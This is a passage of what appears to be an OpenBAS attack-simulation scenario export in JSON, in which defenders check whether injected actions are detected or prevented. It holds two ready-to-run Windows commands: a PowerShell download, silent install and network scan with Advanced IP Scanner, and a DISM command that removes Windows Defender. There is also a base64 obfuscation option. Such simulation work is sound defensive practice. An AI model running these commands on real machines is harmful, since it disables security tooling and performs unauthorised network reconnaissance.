        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ {
      "dependency_relationship" : {
        "inject_parent_id" : "c67d1288-fc54-4e14-ac69-4d5a18939edb",
        "inject_children_id" : "495beca8-854b-45b4-9123-bba7b01f8521"
      },
      "dependency_condition" : {
        "mode" : "and",
        "conditions" : [ {
          "key" : "Execution",
          "value" : true,
          "operator" : "eq"
        } ]
      },
      "dependency_created_at" : "2025-07-04T15:49:39.518354Z",
      "dependency_updated_at" : "2025-07-04T15:49:39.518367Z"
    } ],
    "inject_depends_duration" : 360,
    "inject_injector_contract" : {
      "convertedContent" : {
        "label" : {
          "en" : "Network Service Discovery (advanced ip scanner)",
          "fr" : "Network Service Discovery (advanced ip scanner)"
        },
        "config" : {
          "type" : "openbas_implant",
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "expose" : true,
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "fields" : [ {
          "key" : "assets",
          "type" : "asset",
          "label" : "Assets",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : [ "assets", "assetgroups" ]
        }, {
          "key" : "assetgroups",
          "type" : "asset-group",
          "label" : "Asset groups",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : [ "assets", "assetgroups" ]
        }, {
          "key" : "expectations",
          "type" : "expectation",
          "label" : "Expectations",
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "n",
          "defaultValue" : [ ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : null,
          "predefinedExpectations" : [ {
            "expectation_name" : "Expect inject to be prevented",
            "expectation_type" : "PREVENTION",
            "expectation_score" : 100.0,
            "expectation_description" : null,
            "expectation_expiration_time" : 21600,
            "expectation_expectation_group" : false
          }, {
            "expectation_name" : "Expect inject to be detected",
            "expectation_type" : "DETECTION",
            "expectation_score" : 100.0,
            "expectation_description" : null,
            "expectation_expiration_time" : 21600,
            "expectation_expectation_group" : false
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ]
        }, {
          "key" : "obfuscator",
          "type" : "choice",
          "label" : "Obfuscator",
          "choices" : [ {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          }, {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          } ],
          "readOnly" : false,
          "mandatory" : false,
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "mandatoryGroups" : null
        } ],
        "manual" : false,
        "context" : { },
        "platforms" : [ "Windows" ],
        "variables" : [ {
          "key" : "user",
          "type" : "String",
          "label" : "User that will receive the injection",
          "children" : [ {
            "key" : "user.id",
            "type" : "String",
            "label" : "Id of the user in the platform",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.email",
            "type" : "String",
            "label" : "Email of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.firstname",
            "type" : "String",
            "label" : "First name of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.lastname",
            "type" : "String",
            "label" : "Last name of the user",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "user.lang",
            "type" : "String",
            "label" : "Language of the user",
            "children" : [ ],
            "cardinality" : "1"
          } ],
          "cardinality" : "1"
        }, {
          "key" : "exercise",
          "type" : "Object",
          "label" : "Exercise of the current injection",
          "children" : [ {
            "key" : "exercise.id",
            "type" : "String",
            "label" : "Id of the user in the platform",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "exercise.name",
            "type" : "String",
            "label" : "Name of the exercise",
            "children" : [ ],
            "cardinality" : "1"
          }, {
            "key" : "exercise.description",
            "type" : "String",
            "label" : "Description of the exercise",
            "children" : [ ],
            "cardinality" : "1"
          } ],
          "cardinality" : "1"
        }, {
          "key" : "teams",
          "type" : "String",
          "label" : "List of team name for the injection",
          "children" : [ ],
          "cardinality" : "n"
        }, {
          "key" : "player_uri",
          "type" : "String",
          "label" : "Player interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "challenges_uri",
          "type" : "String",
          "label" : "Challenges interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "scoreboard_uri",
          "type" : "String",
          "label" : "Scoreboard interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        }, {
          "key" : "lessons_uri",
          "type" : "String",
          "label" : "Lessons learned interface platform link",
          "children" : [ ],
          "cardinality" : "1"
        } ],
        "contract_id" : "0cf5103e-9fc7-4914-9dae-d372e40df67b",
        "needs_executor" : true,
        "is_atomic_testing" : true,
        "contract_attack_patterns_external_ids" : [ ]
      },
      "listened" : true,
      "injector_contract_id" : "0cf5103e-9fc7-4914-9dae-d372e40df67b",
      "injector_contract_labels" : {
        "en" : "Network Service Discovery (advanced ip scanner)",
        "fr" : "Network Service Discovery (advanced ip scanner)"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"label\":{\"en\":\"Network Service Discovery (advanced ip scanner)\",\"fr\":\"Network Service Discovery (advanced ip scanner)\"},\"config\":{\"type\":\"openbas_implant\",\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"expose\":true,\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"fields\":[{\"key\":\"assets\",\"type\":\"asset\",\"label\":\"Assets\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":[\"assets\",\"assetgroups\"]},{\"key\":\"assetgroups\",\"type\":\"asset-group\",\"label\":\"Asset groups\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":[\"assets\",\"assetgroups\"]},{\"key\":\"expectations\",\"type\":\"expectation\",\"label\":\"Expectations\",\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"n\",\"defaultValue\":[],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":null,\"predefinedExpectations\":[{\"expectation_name\":\"Expect inject to be prevented\",\"expectation_type\":\"PREVENTION\",\"expectation_score\":100.0,\"expectation_description\":null,\"expectation_expiration_time\":21600,\"expectation_expectation_group\":false},{\"expectation_name\":\"Expect inject to be detected\",\"expectation_type\":\"DETECTION\",\"expectation_score\":100.0,\"expectation_description\":null,\"expectation_expiration_time\":21600,\"expectation_expectation_group\":false},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}]},{\"key\":\"obfuscator\",\"type\":\"choice\",\"label\":\"Obfuscator\",\"choices\":[{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"},{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"}],\"readOnly\":false,\"mandatory\":false,\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"linkedFields\":[],\"linkedValues\":[],\"mandatoryGroups\":null}],\"manual\":false,\"context\":{},\"platforms\":[\"Windows\"],\"variables\":[{\"key\":\"user\",\"type\":\"String\",\"label\":\"User that will receive the injection\",\"children\":[{\"key\":\"user.id\",\"type\":\"String\",\"label\":\"Id of the user in the platform\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.email\",\"type\":\"String\",\"label\":\"Email of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.firstname\",\"type\":\"String\",\"label\":\"First name of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.lastname\",\"type\":\"String\",\"label\":\"Last name of the user\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"user.lang\",\"type\":\"String\",\"label\":\"Language of the user\",\"children\":[],\"cardinality\":\"1\"}],\"cardinality\":\"1\"},{\"key\":\"exercise\",\"type\":\"Object\",\"label\":\"Exercise of the current injection\",\"children\":[{\"key\":\"exercise.id\",\"type\":\"String\",\"label\":\"Id of the user in the platform\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"exercise.name\",\"type\":\"String\",\"label\":\"Name of the exercise\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"exercise.description\",\"type\":\"String\",\"label\":\"Description of the exercise\",\"children\":[],\"cardinality\":\"1\"}],\"cardinality\":\"1\"},{\"key\":\"teams\",\"type\":\"String\",\"label\":\"List of team name for the injection\",\"children\":[],\"cardinality\":\"n\"},{\"key\":\"player_uri\",\"type\":\"String\",\"label\":\"Player interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"challenges_uri\",\"type\":\"String\",\"label\":\"Challenges interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"scoreboard_uri\",\"type\":\"String\",\"label\":\"Scoreboard interface platform link\",\"children\":[],\"cardinality\":\"1\"},{\"key\":\"lessons_uri\",\"type\":\"String\",\"label\":\"Lessons learned interface platform link\",\"children\":[],\"cardinality\":\"1\"}],\"contract_id\":\"0cf5103e-9fc7-4914-9dae-d372e40df67b\",\"needs_executor\":true,\"is_atomic_testing\":true,\"contract_attack_patterns_external_ids\":[]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "d84a3db1-5911-4d28-8f87-63e2e2394b02",
        "payload_type" : "Command",
        "payload_name" : "Network Service Discovery (advanced ip scanner)",
        "payload_description" : "",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : null,
        "payload_source" : "MANUAL",
        "payload_status" : "VERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : null,
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-16T13:30:00.823405Z",
        "payload_updated_at" : "2024-12-16T13:30:00.823406Z",
        "command_executor" : "psh",
        "command_content" : "Invoke-WebRequest -Uri \"https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe\" -OutFile \"C:\\temp\\Advanced_IP_Scanner_2.5.4594.1.exe\"\nC:\\temp\\Advanced_IP_Scanner_2.5.4594.1.exe /SP- /VERYSILENT\ncmd.exe /c \"C:\\Program Files (x86)\\Advanced IP Scanner\\advanced_ip_scanner_console.exe\" \"/r:10.10.10.1-10.10.10.255\"",
        "payload_collector_type" : null
      },
      "injector_contract_created_at" : "2024-12-16T13:30:00.828026Z",
      "injector_contract_updated_at" : "2024-12-16T13:30:00.828026Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "b35a8c1f-2eb5-41a4-8be8-d72fec55bb03",
    "inject_title" : "Disable Windows Defender with DISM",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1320,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Disable Windows Defender with DISM",
          "fr" : "Disable Windows Defender with DISM"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "d4fb60de-d7f7-4a08-97f7-f5ef1aac9394",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "d4fb60de-d7f7-4a08-97f7-f5ef1aac9394",
      "injector_contract_labels" : {
        "en" : "Disable Windows Defender with DISM",
        "fr" : "Disable Windows Defender with DISM"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Disable Windows Defender with DISM\",\"fr\":\"Disable Windows Defender with DISM\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"d4fb60de-d7f7-4a08-97f7-f5ef1aac9394\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "77a188b7-6844-4c6d-bd62-1e01b1767c3a",
        "payload_type" : "Command",
        "payload_name" : "Disable Windows Defender with DISM",
        "payload_description" : "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
          "attack_pattern_name" : "Disable or Modify Tools",
          "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
          "attack_pattern_external_id" : "T1562.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
            "phase_external_id" : "TA0005",
            "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
            "phase_name" : "Defense Evasion",
            "phase_shortname" : "defense-evasion",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "phase_order" : 6
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "871438ac-7d6e-432a-b27d-3e7db69faf58",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:40.930692Z",
        "payload_updated_at" : "2025-07-03T14:45:28.593944Z",
        "command_executor" : "cmd",
        "command_content" : "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:40.946325Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:40.946325Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
        "attack_pattern_name" : "Disable or Modify Tools",
        "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
        "attack_pattern_external_id" : "T1562.001",
        "attack_pattern_kill_chain_phases" : [ {
